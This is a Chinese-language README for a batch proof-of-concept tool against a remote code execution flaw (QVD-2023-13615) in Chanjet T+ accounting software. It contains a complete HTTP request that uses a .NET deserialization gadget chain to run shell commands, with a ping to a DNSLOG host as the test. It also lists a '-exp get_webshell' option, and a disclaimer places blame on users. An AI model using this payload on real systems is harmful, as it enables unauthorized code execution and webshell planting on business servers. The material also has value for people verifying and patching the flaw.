

## QVD-2023-13615 用友畅捷通T 远程代码执行漏洞 批量POC！

畅捷通远程代码执行漏洞，某些情况下攻击者利用该漏洞可在底层操作系统上执行shell命令。

### 影响范围

  畅捷通T+ 13.0

  畅捷通T+ 16.0

### Usage

```
-u url
-f 文件
-nd 不使用DNSLOG
-exp get_webshell

```

POC

### 数据包

```

POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
X-Ajaxpro-Method: GetStoreWarehouseByStore
Content-Length: 557

{
 "storeID":{
  "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName":"Start",
  "ObjectInstance":{
   "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
   "StartInfo":{
    "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "FileName":"cmd",
    "Arguments":"/c ping xxx.dnslog"
   }
  }
 }
}
```

## 免责声明

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，**均由使用者本人负责，作者不为此承担任何责任**。
















